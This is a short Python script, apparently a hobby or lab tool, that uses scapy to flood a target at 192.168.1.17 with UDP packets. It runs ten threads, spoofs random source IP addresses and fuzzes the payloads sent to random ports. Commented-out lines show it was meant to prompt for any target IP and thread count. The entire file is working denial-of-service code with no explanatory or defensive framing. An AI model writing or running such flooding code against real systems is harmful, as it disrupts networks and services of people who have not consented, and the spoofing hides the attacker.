from scapy.all import *
import threading
# tarIP = input("Target IP:")
#countThread = int(input("Enter Threads:"))

def udpFlood(dest):
    for x in range(100):
        IP_Packet = IP()
        IP_Packet.src = str(RandIP())
        IP_Packet.dst = dest

        UDP_Packet = UDP()
        UDP_Packet.dport = RandShort()

        send(IP_Packet/fuzz(UDP_Packet),verbose=False)
        print("-"*35 + "UDP FLOOD"+35*"-"+"\n")
#threads = countThread
threads = []
for _ in range(10):
    t = threading.Thread(target=udpFlood,args=("192.168.1.17",))
    t.start()
    threads.append(t)
for thread in threads:
    thread.join()
